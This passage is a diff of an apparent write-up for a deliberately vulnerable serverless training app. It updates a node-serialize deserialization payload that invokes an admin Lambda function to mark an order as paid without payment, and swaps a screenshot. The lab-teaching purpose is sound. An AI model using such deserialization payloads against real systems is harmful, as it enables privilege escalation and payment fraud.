@@ -47,10 +47,10 @@ Now, we have to pass it as part of the exploit itself:
 Which eventually looks like that:
 
 ```
-{"action": "_$$ND_FUNC$$_function(){var p=JSON.stringify({\"body\": {\"action\": \"update\", \"item\": {\"status\": 120, \"userId\": \"12312312-1233-1233-1233-123123123123\", \"ts\": 1545594489, \"token\": \"aSD32d2ASd2\", \"itemList\": {\"20\": 2}, \"address\": {\"address\": \"po box 131337\", \"name\": \"john doe\", \"email\": \"secret@email.com\"}, \"total\": 25}, \"order-id\": \"cc241d5c-f665-48db-8e55-4391f62465ba\"}});var a=require(\"aws-sdk\");var l=new a.Lambda();var x={FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:p};l.invoke(x, function(e,d){});}()"}
+{"action": "_$$ND_FUNC$$_function(){var p=JSON.stringify({\"headers\":{\"authorization\":\"eyJra ... l7g10i5Q\"}, \"body\":{\"action\":\"update\", \"order-id\": \"480e3996-e8a7-4fdb-bc12-94fdae1e14fb\", \"item\":{\"token\": \"VFqDWCgagMO7\", \"ts\": 1546482872, \"itemList\": {\"11\": 1, \"12\": 1}, \"address\": \"100 Fake st., NYC, USA\", \"total\": 74, \"status\": 120}}});var a=require(\"aws-sdk\");var l=new a.Lambda();var x={FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:p};l.invoke(x, function(e,d){});}()"}
 ```
 
-![alt stealing](https://i.imgur.com/8NXyXlQ.png)
+![alt stealing](https://i.imgur.com/FrzRrjS.png)
 
 We got an error from the API function. But the database was updated with the new data. Since we did not issue a SQS notification for the payment, the receipt will be proccessed with a daily cron-job function. However, it is already possible to see it in the orders page.
 
